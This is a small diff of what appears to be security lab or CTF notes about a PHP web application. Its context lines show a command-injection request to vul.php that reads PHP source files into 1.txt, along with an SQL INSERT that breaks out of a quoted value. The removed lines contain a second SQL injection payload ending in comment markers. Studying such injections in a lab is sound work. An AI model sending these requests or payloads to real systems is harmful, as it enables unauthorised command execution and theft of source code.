@@ -190,5 +190,3 @@ GET /start/vul.php?cmd=echo+"`cat+../a*/*.php`">1.txt
 ```
 insert into article(title,author,description,content,dateline) values('1'','13123','3131','313',1713177034)
 ```
-insert into article(title,author,description,content,dateline) values('1'','13123','3131','313',1713177034)
-1','114514','114514','114514',14141414)# --+ %23
